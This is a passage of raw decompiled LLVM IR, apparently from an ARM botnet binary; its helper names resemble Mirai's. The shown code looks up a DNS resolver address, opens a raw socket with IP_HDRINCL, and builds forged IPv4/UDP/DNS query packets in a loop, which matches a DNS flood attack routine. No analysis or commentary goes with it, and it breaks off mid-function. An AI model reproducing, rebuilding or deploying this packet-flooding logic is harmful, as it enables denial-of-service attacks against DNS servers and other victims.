  store i32 25, i32* %r0.global-to-local, align 4
  %v3_c354 = call i32 @table_retrieve_val(i32 25, i32* null)
  %v0_c358 = load i32, i32* @r5, align 4
  store i32 %v0_c358, i32* @r1, align 4
  store i32 %v3_c354, i32* %r2.global-to-local, align 4
  store i32 %v2_c324, i32* %r0.global-to-local, align 4
  %v3_c364 = bitcast i32* %stack_var_-2124 to i8*
  %v4_c364 = call i32 @util_stristr(i8* %v3_c364, i32 %v0_c358, i32 %v3_c354)
  store i32 %v4_c364, i32* @r6, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_c370 = call i32 @table_lock_val(i32 25)
  store i32 %v1_c370, i32* %r0.global-to-local, align 4
  %v0_c374 = load i32, i32* @r6, align 4
  %v7_c374 = icmp eq i32 %v0_c374, -1
  store i1 %v7_c374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c374, label %dec_label_pc_c814, label %dec_label_pc_c37c

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c320
  %v0_c37c = load i32, i32* @r5, align 4
  %v9_c37c = icmp eq i32 %v0_c37c, %v0_c374
  store i1 %v9_c37c, i1* %cpsr_z.global-to-local, align 1
  %v7_c380 = icmp sgt i32 %v0_c37c, %v0_c374
  br i1 %v7_c380, label %dec_label_pc_c384, label %dec_label_pc_c814

dec_label_pc_c384:                                ; preds = %dec_label_pc_c37c
  %v0_c384 = load i32, i32* @sl, align 4
  %v2_c384 = add i32 %v0_c384, %v0_c374
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v0_c374, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c3b0 = add i32 %v0_c37c, -1
  br label %dec_label_pc_c3a8

dec_label_pc_c394:                                ; preds = %dec_label_pc_c3d0, %bb104
  %v9_c394 = icmp eq i32 %v1_c3b0, %v0_c39c
  store i1 %v9_c394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c394, label %dec_label_pc_c3e0, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c3c0, %dec_label_pc_c394, %bb
  %v0_c3cc29 = phi i32 [ %v0_c3cc, %dec_label_pc_c3c0 ], [ %v0_c3cc30, %dec_label_pc_c394 ], [ %v0_c3cc, %bb ]
  %v0_c3ac25 = phi i32 [ 0, %dec_label_pc_c3c0 ], [ %v0_c3ac26, %dec_label_pc_c394 ], [ 0, %bb ]
  %v1_c39c = add i32 %v0_c39c, 1
  store i32 %v1_c39c, i32* %r2.global-to-local, align 4
  %v9_c3a0 = icmp eq i32 %v1_c39c, %v0_c37c
  store i1 %v9_c3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c3a0, label %dec_label_pc_c814, label %dec_label_pc_c3a8

dec_label_pc_c3a8:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c384
  %v0_c39c = phi i32 [ %v1_c39c, %dec_label_pc_c39c ], [ %v0_c374, %dec_label_pc_c384 ]
  %v0_c3cc = phi i32 [ %v0_c3cc29, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3ac = phi i32 [ %v0_c3ac25, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3b4 = phi i32 [ %v1_c3b4, %dec_label_pc_c39c ], [ %v2_c384, %dec_label_pc_c384 ]
  %v1_c3a8 = inttoptr i32 %v0_c3b4 to i8*
  %v2_c3a8 = load i8, i8* %v1_c3a8, align 1
  %v3_c3a8 = zext i8 %v2_c3a8 to i32
  store i32 %v3_c3a8, i32* %r3.global-to-local, align 4
  %v2_c3ac = icmp eq i32 %v0_c3ac, 0
  store i1 %v2_c3ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c3b0, i32* @r4, align 4
  %v1_c3b4 = add i32 %v0_c3b4, 1
  store i32 %v1_c3b4, i32* %r1.global-to-local, align 4
  %v1_c3b8 = add nsw i32 %v3_c3a8, -48
  store i32 %v1_c3b8, i32* %r0.global-to-local, align 4
  br i1 %v2_c3ac, label %dec_label_pc_c3c0, label %dec_label_pc_c3d0

dec_label_pc_c3c0:                                ; preds = %dec_label_pc_c3a8
  %v7_c3c0 = icmp eq i8 %v2_c3a8, 9
  store i1 %v7_c3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3c0, label %dec_label_pc_c39c, label %bb

bb:                                               ; preds = %dec_label_pc_c3c0
  %v8_c3c4 = icmp eq i8 %v2_c3a8, 32
  store i1 %v8_c3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c3c4, label %dec_label_pc_c39c, label %dec_label_pc_c3cc

dec_label_pc_c3cc:                                ; preds = %bb
  %v1_c3cc = add i32 %v0_c3cc, 1
  store i32 %v1_c3cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c3d0

dec_label_pc_c3d0:                                ; preds = %dec_label_pc_c3a8, %dec_label_pc_c3cc
  %v0_c3cc30 = phi i32 [ %v0_c3cc, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v0_c3ac26 = phi i32 [ %v0_c3ac, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v7_c3d0 = icmp eq i8 %v2_c3a8, 46
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c394, label %bb104

bb104:                                            ; preds = %dec_label_pc_c3d0
  %v8_c3d4 = icmp eq i32 %v1_c3b8, 9
  store i1 %v8_c3d4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_c3b8, 10
  br i1 %tmp, label %dec_label_pc_c394, label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %bb104
  br label %dec_label_pc_c3e0

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c394, %dec_label_pc_c3dc
  %v0_c39c127 = phi i32 [ %v0_c39c, %dec_label_pc_c3dc ], [ %v1_c3b0, %dec_label_pc_c394 ]
  %v2_c3e4 = sub i32 %v0_c39c127, %v0_c374
  store i32 %v2_c3e4, i32* @r4, align 4
  %v2_c3e8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v2_c3e8, i32* %r0.global-to-local, align 4
  store i32 %v2_c3e4, i32* %r2.global-to-local, align 4
  %v3_c3f8 = call i32 @util_memcpy(i32 %v2_c3e8, i32 %v2_c384, i32 %v2_c3e4)
  %v2_c3fc = ptrtoint i32* %stack_var_-40 to i32
  %v1_c400 = load i32, i32* @r4, align 4
  %v2_c400 = add i32 %v1_c400, %v2_c3fc
  store i32 %v2_c400, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3e8, i32* @r0, align 4
  %v3_c40c = add i32 %v2_c400, -36
  %v4_c40c = inttoptr i32 %v3_c40c to i8*
  store i8 0, i8* %v4_c40c, align 1
  %v1_c410 = call i32 @inet_addr(i32 %v2_c3e8)
  store i32 %v1_c410, i32* %r0.global-to-local, align 4
  store i32 %v1_c410, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c4189:                               ; preds = %dec_label_pc_c814
  unreachable

dec_label_pc_c418:                                ; preds = %dec_label_pc_c874, %dec_label_pc_c86c, %dec_label_pc_c860, %dec_label_pc_c850, %dec_label_pc_c3e0
  %v1_c84c50 = phi i32 [ %v1_c818, %dec_label_pc_c874 ], [ %v1_c818, %dec_label_pc_c86c ], [ %v1_c818, %dec_label_pc_c860 ], [ %v1_c818, %dec_label_pc_c850 ], [ %v1_c410, %dec_label_pc_c3e0 ]
  %v0_c418 = load i32, i32* @r7, align 4
  %v2_c418 = icmp eq i32 %v0_c418, 0
  store i1 %v2_c418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c418, label %dec_label_pc_c840, label %dec_label_pc_c420

dec_label_pc_c420:                                ; preds = %dec_label_pc_c418
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v1_c424 = inttoptr i32 %v0_c418 to i8*
  %v2_c424 = call i32 @util_strlen(i8* %v1_c424)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_c424, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c438 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v7_c43c = icmp eq i32 %v3_c438, -1
  store i1 %v7_c43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c43c, label %dec_label_pc_c840, label %dec_label_pc_c448

dec_label_pc_c448:                                ; preds = %dec_label_pc_c420
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c450 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c450, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c464 = call i32 @__GI_setsockopt(i32 %v3_c438, i32 0, i32 3, i32 %v6_c450, i32 4)
  store i32 %v5_c464, i32* %r0.global-to-local, align 4
  %v7_c468 = icmp eq i32 %v5_c464, -1
  store i1 %v7_c468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c468, label %dec_label_pc_c838, label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %dec_label_pc_c448
  %v0_c478 = load i32, i32* %sb.global-to-local, align 4
  %v1_c478 = urem i32 %v0_c478, 256
  store i32 %v1_c478, i32* %sb.global-to-local, align 4
  %v3_c480 = mul i32 %v6_c284, 65536
  store i32 %v3_c480, i32* %r3.global-to-local, align 4
  %v5_c48c = trunc i32 %v0_c478 to i8
  %v0_c490 = load i32, i32* @r8, align 4
  %v2_c490 = icmp eq i32 %v0_c490, 0
  store i1 %v2_c490, i1* %cpsr_z.global-to-local, align 1
  %v3_c494 = urem i32 %v7_c228, 65536
  store i32 %v3_c494, i32* %r0.global-to-local, align 4
  %v3_c49c = urem i32 %v6_c284, 65536
  store i32 %v3_c49c, i32* %r2.global-to-local, align 4
  %v3_c4a0 = mul i32 %v6_c29c, 65536
  %v3_c4a4 = mul i32 %v6_c2b8, 65536
  store i32 %v3_c4a4, i32* %ip.global-to-local, align 4
  br i1 %v2_c490, label %bb105, label %bb106

bb105:                                            ; preds = %dec_label_pc_c470
  %v5_c4ac = sext i8 %v5_c48c to i32
  store i32 %v5_c4ac, i32* %r2.global-to-local, align 4
  br label %bb106

bb106:                                            ; preds = %dec_label_pc_c470, %bb105
  %v2_c4d8 = phi i32 [ %v3_c49c, %dec_label_pc_c470 ], [ %v5_c4ac, %bb105 ]
  %v3_c4b8 = urem i32 %v6_c29c, 65536
  store i32 %v3_c4b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_c4c0 = urem i32 %v6_c2b8, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_c4d8 = load i32, i32* @r6, align 4
  br i1 %v2_c490, label %.dec_label_pc_c6c0.preheader_crit_edge, label %dec_label_pc_c4e0

.dec_label_pc_c6c0.preheader_crit_edge:           ; preds = %bb106
  %v3_c4d8 = add i32 %v1_c4d8, %v2_c4d8
  store i32 %v3_c4d8, i32* @r7, align 4
  %.pre = sext i8 %v5_c48c to i32
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c4e0:                                ; preds = %bb106
  %v2_c4e0 = add i32 %v1_c4d8, %v1_c478
  %v3_c4e4 = mul i32 %v2_c4e0, 65536
  %v1_c4ec = add i32 %v3_c4e4, 1769472
  %v1_c4f0 = add i32 %v3_c4e4, 3080192
  %tmp107 = udiv i32 %v1_c4f0, 256
  %v3_c504 = and i32 %tmp107, 65280
  %v4_c514 = udiv i32 %v1_c4f0, 16777216
  %v5_c514 = or i32 %v3_c504, %v4_c514
  store i32 %v5_c514, i32* @sl, align 4
  %trunc61 = trunc i32 %v6_c284 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc61)
  %tmp108 = mul i32 %v7_c228, 256
  %v3_c528 = and i32 %tmp108, 65280
  store i32 %v3_c528, i32* %r1.global-to-local, align 4
  %tmp109 = udiv i32 %v7_c228, 256
  %v4_c52c = urem i32 %tmp109, 256
  %v5_c52c = or i32 %v4_c52c, %v3_c528
  store i32 %v5_c52c, i32* @sb, align 4
  store i32 %v3_c4a4, i32* %r2.global-to-local, align 4
  store i32 %v3_c4a0, i32* %r0.global-to-local, align 4
  %tmp110 = mul i32 %v6_c29c, 256
  %v3_c540 = and i32 %tmp110, 65280
  %tmp111 = mul i32 %v6_c2b8, 256
  %v3_c544 = and i32 %tmp111, 65280
  %tmp112 = udiv i32 %v1_c4ec, 256
  %v3_c548 = and i32 %tmp112, 65280
  store i32 %v3_c548, i32* @lr, align 4
  %tmp113 = udiv i32 %v6_c29c, 256
  %v4_c54c = urem i32 %tmp113, 256
  %v5_c54c = or i32 %v4_c54c, %v3_c540
  store i32 %v5_c54c, i32* %ip.global-to-local, align 4
  %tmp114 = udiv i32 %v6_c2b8, 256
  %v4_c550 = urem i32 %tmp114, 256
  %v5_c550 = or i32 %v4_c550, %v3_c544
  store i32 %v5_c550, i32* @r4, align 4
  %v1_c554 = add i32 %v1_c4d8, 1
  store i32 %v1_c554, i32* %r3.global-to-local, align 4
  %v4_c558 = udiv i32 %v1_c4ec, 16777216
  %v5_c558 = or i32 %v4_c558, %tmp112
  store i32 0, i32* @r5, align 4
  %v4_c5dc = sext i8 %v5_c48c to i32
  %sext = mul nuw i32 %v5_c54c, 65536
  %v7_c5f0 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_c550, 65536
  %v4_c618 = sdiv i32 %sext8, 65536
  %v1_c5b8 = trunc i32 %v5_c228 to i8
  %extract.t = trunc i32 %v5_c260 to i8
  %v1_c5e0 = add nsw i32 %v4_c5dc, 41
  %sext121 = mul i32 %v5_c558, 65536
  %v3_c5f0 = sdiv i32 %sext121, 65536
  br label %dec_label_pc_c570

dec_label_pc_c570:                                ; preds = %dec_label_pc_c690, %dec_label_pc_c4e0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_c578 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_c578, i32* %r0.global-to-local, align 4
  store i32 %v2_c1ec, i32* %ip.global-to-local, align 4
  %v3_c580 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c580, i32* %r3.global-to-local, align 4
  %v2_c584 = load i32, i32* @r5, align 4
  %v5_c584 = mul i32 %v2_c584, 4
  %v6_c584 = add i32 %v5_c584, %v2_c1ec
  %v7_c584 = inttoptr i32 %v6_c584 to i32*
  store i32 %v2_c578, i32* %v7_c584, align 4
  %v0_c588 = load i32, i32* %ip.global-to-local, align 4
  %v1_c588 = load i32, i32* %r3.global-to-local, align 4
  %v4_c588 = mul i32 %v1_c588, 4
  %v5_c588 = add i32 %v4_c588, %v0_c588
  %v6_c588 = inttoptr i32 %v5_c588 to i32*
  %v7_c588 = load i32, i32* %v6_c588, align 4
  store i32 %v7_c588, i32* %r1.global-to-local, align 4
  %v1_c58c = inttoptr i32 %v7_c588 to i8*
  %v2_c58c = load i8, i8* %v1_c58c, align 1
  %tmp132 = urem i8 %v2_c58c, 16
  %v1_c590 = zext i8 %tmp132 to i32
  %v1_c594 = or i32 %v1_c590, 64
  store i32 %v1_c594, i32* %r2.global-to-local, align 4
  %v1_c598 = trunc i32 %v1_c594 to i8
  store i8 %v1_c598, i8* %v1_c58c, align 1
  %v0_c59c = load i32, i32* %r1.global-to-local, align 4
  %v1_c59c = inttoptr i32 %v0_c59c to i8*
  %v2_c59c = load i8, i8* %v1_c59c, align 1
  %v3_c59c = zext i8 %v2_c59c to i32
  %v1_c5a0 = and i32 %v3_c59c, 240
  %v1_c5a4 = or i32 %v1_c5a0, 5
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  store i32 %v1_c26c, i32* %lr.global-to-local, align 4
  %v1_c5ac = trunc i32 %v1_c5a4 to i8
  store i8 %v1_c5ac, i8* %v1_c59c, align 1
  store i32 %v5_c228, i32* %r0.global-to-local, align 4
  %v0_c5b4 = load i32, i32* %lr.global-to-local, align 4
  %v2_c5b4 = icmp eq i32 %v0_c5b4, 0
  store i1 %v2_c5b4, i1* %cpsr_z.global-to-local, align 1
  %v2_c5b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 1
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i8*
  store i8 %v1_c5b8, i8* %v4_c5b8, align 1
  store i32 %v5_c260, i32* %r2.global-to-local, align 4
  %v0_c5c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c5c0, label %.thread11, label %bb115

bb115:                                            ; preds = %dec_label_pc_c570
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c5c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_c5c4 = add i32 %v3_c5c4, 6
  %v5_c5c4 = inttoptr i32 %v4_c5c4 to i16*
  store i16 64, i16* %v5_c5c4, align 2
  %v0_c5cc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t53 = trunc i32 %v0_c5cc.pre to i8
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_c570, %bb115
  %v0_c5cc.off0 = phi i8 [ %extract.t, %dec_label_pc_c570 ], [ %extract.t53, %bb115 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_c5cc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5cc = add i32 %v2_c5cc, 8
  %v4_c5cc = inttoptr i32 %v3_c5cc to i8*
  store i8 %v0_c5cc.off0, i8* %v4_c5cc, align 1
  %v0_c5d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5d0 = trunc i32 %v0_c5d0 to i8
  %v2_c5d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5d0 = add i32 %v2_c5d0, 9
  %v4_c5d0 = inttoptr i32 %v3_c5d0 to i8*
  store i8 %v1_c5d0, i8* %v4_c5d0, align 1
  %v2_c5d8 = load i32, i32* @global_var_2471c.58, align 4
  %v0_c5e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c5e4 = add i32 %v1_c5e0, %v0_c5e0
  store i32 %v2_c5e4, i32* @r4, align 4
  %v2_c5e8 = add i32 %v0_c5e0, 12
  %v3_c5e8 = inttoptr i32 %v2_c5e8 to i32*
  store i32 %v2_c5d8, i32* %v3_c5e8, align 4
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  store i32 %v7_c5f0, i32* %r3.global-to-local, align 4
  %v0_c5f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5f4 = add i32 %v0_c5f4, 20
  store i32 %v1_c5f4, i32* %ip.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @sl, align 4
  %v1_c5f8 = trunc i32 %v0_c5f8 to i16
  %v3_c5f8 = add i32 %v0_c5f4, 2
  %v4_c5f8 = inttoptr i32 %v3_c5f8 to i16*
  store i16 %v1_c5f8, i16* %v4_c5f8, align 2
  %v0_c5fc = load i32, i32* @sb, align 4
  %v1_c5fc = trunc i32 %v0_c5fc to i16
  %v2_c5fc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5fc = add i32 %v2_c5fc, 4
  %v4_c5fc = inttoptr i32 %v3_c5fc to i16*
  store i16 %v1_c5fc, i16* %v4_c5fc, align 2
  %v0_c600 = load i32, i32* %r2.global-to-local, align 4
  %v1_c600 = trunc i32 %v0_c600 to i16
  %v2_c600 = load i32, i32* %ip.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 4
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v0_c604 = load i32, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v0_c604 to i16
  %v2_c604 = load i32, i32* %ip.global-to-local, align 4
  %v3_c604 = add i32 %v2_c604, 2
  %v4_c604 = inttoptr i32 %v3_c604 to i16*
  store i16 %v1_c604, i16* %v4_c604, align 2
  %v2_c60c = load i32, i32* %r1.global-to-local, align 4
  %v3_c60c = add i32 %v2_c60c, 20
  %v4_c60c = inttoptr i32 %v3_c60c to i16*
  store i16 %rev, i16* %v4_c60c, align 2
  store i32 %v4_c5dc, i32* %ip.global-to-local, align 4
  %v0_c614 = load i32, i32* %r1.global-to-local, align 4
  %v1_c614 = add i32 %v0_c614, 28
  store i32 %v1_c614, i32* %r0.global-to-local, align 4
  store i32 %v4_c618, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_c624 = add i32 %v0_c614, 30
  %v4_c624 = inttoptr i32 %v3_c624 to i16*
  store i16 1, i16* %v4_c624, align 2
  %v0_c628 = load i32, i32* @lr, align 4
  %v1_c628 = trunc i32 %v0_c628 to i16
  %v2_c628 = load i32, i32* %r0.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 4
  %v4_c628 = inttoptr i32 %v3_c628 to i16*
  store i16 %v1_c628, i16* %v4_c628, align 2
  %v0_c62c = load i32, i32* %ip.global-to-local, align 4
  %v1_c62c = trunc i32 %v0_c62c to i8
  %v2_c62c = load i32, i32* %r1.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 40
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 %v1_c62c, i8* %v4_c62c, align 1
  %v0_c630 = load i32, i32* @fp, align 4
  %v1_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v0_c630, i32* %v3_c630, align 4
  %v0_c634 = load i32, i32* %r3.global-to-local, align 4
  %v1_c634 = trunc i32 %v0_c634 to i16
  %v2_c634 = load i32, i32* %r1.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 28
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %v1_c634, i16* %v4_c634, align 2
  %v0_c638 = load i32, i32* @r4, align 4
  %v1_c638 = add i32 %v0_c638, 1
  store i32 %v1_c638, i32* %r0.global-to-local, align 4
  %v0_c63c = load i32, i32* @r7, align 4
  store i32 %v0_c63c, i32* %r1.global-to-local, align 4
  store i32 %v1_c554, i32* %r2.global-to-local, align 4
  %v3_c644 = call i32 @util_memcpy(i32 %v1_c638, i32 %v0_c63c, i32 %v1_c554)
  store i32 %v3_c644, i32* %r0.global-to-local, align 4
  %v0_c648 = load i32, i32* @r6, align 4
  %v2_c648 = icmp eq i32 %v0_c648, 0
  store i1 %v2_c648, i1* %cpsr_z.global-to-local, align 1
  %tmp116 = icmp slt i32 %v0_c648, 1
  br i1 %tmp116, label %bb117, label %dec_label_pc_c658

bb117:                                            ; preds = %.thread11
  %v5_c64c = load i32, i32* @r4, align 4
  store i32 %v5_c64c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c690

dec_label_pc_c658:                                ; preds = %.thread11
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_c65c = load i32, i32* @r4, align 4
  store i32 %v0_c65c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %.thread18, %dec_label_pc_c658
  %v0_c670 = phi i32 [ %storemerge, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v0_c674 = phi i32 [ %v0_c688, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v1_c664 = load i32, i32* @r7, align 4
  %v2_c664 = add i32 %v1_c664, %v0_c674
  %v3_c664 = inttoptr i32 %v2_c664 to i8*
  %v4_c664 = load i8, i8* %v3_c664, align 1
  %v6_c664 = zext i8 %v4_c664 to i32
  store i32 %v6_c664, i32* %r3.global-to-local, align 4
  %v7_c668 = icmp eq i8 %v4_c664, 46
  store i1 %v7_c668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c668, label %bb118, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_c664
  %v1_c67014 = add nsw i32 %v0_c670, 1
  store i32 %v1_c67014, i32* %r2.global-to-local, align 4
  %v1_c67416 = add i32 %v0_c674, 1
  store i32 %v1_c67416, i32* %r1.global-to-local, align 4
  br label %bb119

bb118:                                            ; preds = %dec_label_pc_c664
  %v2_c66c = load i32, i32* @r4, align 4
  %v3_c66c = add i32 %v2_c66c, %v0_c674
  store i32 %v3_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add nsw i32 %v0_c670, 1
  store i32 %v1_c670, i32* %r2.global-to-local, align 4
  %v1_c674 = add i32 %v0_c674, 1
  store i32 %v1_c674, i32* %r1.global-to-local, align 4
  %v2_c678 = trunc i32 %v0_c670 to i8
  %v3_c678 = load i32, i32* %r0.global-to-local, align 4
  %v4_c678 = inttoptr i32 %v3_c678 to i8*
  store i8 %v2_c678, i8* %v4_c678, align 1
  %v0_c67c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c67c.pre, label %bb120, label %bb118.bb119_crit_edge

bb118.bb119_crit_edge:                            ; preds = %bb118
  %v1_c67c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %bb118.bb119_crit_edge, %.thread60
  %v1_c67c = phi i32 [ %v1_c67c.pre, %bb118.bb119_crit_edge ], [ %v1_c67014, %.thread60 ]
  %v2_c67c = urem i32 %v1_c67c, 256
  br label %.thread18

bb120:                                            ; preds = %bb118
  %v1_c680 = load i32, i32* %r3.global-to-local, align 4
  %v2_c680 = add i32 %v1_c680, 1
  store i32 %v2_c680, i32* %r0.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb119, %bb120
  %storemerge = phi i32 [ %v2_c67c, %bb119 ], [ 0, %bb120 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_c688 = load i32, i32* %r1.global-to-local, align 4
  %v1_c688 = load i32, i32* @r6, align 4
  %v9_c688 = icmp eq i32 %v0_c688, %v1_c688
  store i1 %v9_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c688, label %dec_label_pc_c690.loopexit, label %dec_label_pc_c664

dec_label_pc_c690.loopexit:                       ; preds = %.thread18
  %v2_c690.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t131 = trunc i32 %storemerge to i8
  br label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %bb117, %dec_label_pc_c690.loopexit
  %v0_c690.off0 = phi i8 [ %extract.t131, %dec_label_pc_c690.loopexit ], [ 0, %bb117 ]
  %v2_c690 = phi i32 [ %v2_c690.pre, %dec_label_pc_c690.loopexit ], [ %v5_c64c, %bb117 ]
  %v3_c690 = inttoptr i32 %v2_c690 to i8*
  store i8 %v0_c690.off0, i8* %v3_c690, align 1
  %v3_c694 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = add i32 %v3_c694, 1
  store i32 %v1_c698, i32* @r5, align 4
  %v0_c69c = load i32, i32* @r4, align 4
  %v1_c69c = load i32, i32* @r6, align 4
  %v2_c69c = add i32 %v1_c69c, %v0_c69c
  store i32 %v2_c69c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_c6a4 = load i32, i32* @r8, align 4
  %v9_c6a4 = icmp eq i32 %v0_c6a4, %v1_c698
  store i1 %v9_c6a4, i1* %cpsr_z.global-to-local, align 1
  %v3_c6a8 = add i32 %v2_c69c, 4
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i16*
  store i16 256, i16* %v4_c6a8, align 2
  %v0_c6ac = load i32, i32* @lr, align 4
  %v1_c6ac = trunc i32 %v0_c6ac to i16
  %v2_c6ac = load i32, i32* %r2.global-to-local, align 4
  %v3_c6ac = add i32 %v2_c6ac, 2
  %v4_c6ac = inttoptr i32 %v3_c6ac to i16*
  store i16 %v1_c6ac, i16* %v4_c6ac, align 2
  %v0_c6b0 = load i32, i32* @r5, align 4
  store i32 %v0_c6b0, i32* %stack_var_-44, align 4
  %v8_c6b4 = icmp sgt i32 %v0_c6a4, %v1_c698
  br i1 %v8_c6b4, label %dec_label_pc_c570, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c690
  store i32 %v4_c5dc, i32* %r0.global-to-local, align 4
  %v0_c6bc = load i32, i32* @r6, align 4
  %v2_c6bc = add i32 %v0_c6bc, %v4_c5dc
  store i32 %v2_c6bc, i32* @r7, align 4
  %v0_c6c4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c6c0.preheader:                      ; preds = %.dec_label_pc_c6c0.preheader_crit_edge, %dec_label_pc_c6b8
  %v4_c724.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v4_c5dc, %dec_label_pc_c6b8 ]
  %v0_c6c4.pre = phi i32 [ 0, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v0_c6c4.pre.pre, %dec_label_pc_c6b8 ]
  %v3_c6f0 = icmp eq i32 %v3_c494, 65535
  %v3_c700 = icmp eq i32 %v3_c49c, 65535
  br label %dec_label_pc_c6c0

dec_label_pc_c6c0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8, %dec_label_pc_c6c0.preheader
  %v0_c6c4 = phi i32 [ %v0_c6c4.pre, %dec_label_pc_c6c0.preheader ], [ 0, %dec_label_pc_c7b8 ], [ 0, %dec_label_pc_c6c0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c6c4 = icmp eq i32 %v0_c6c4, 0
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
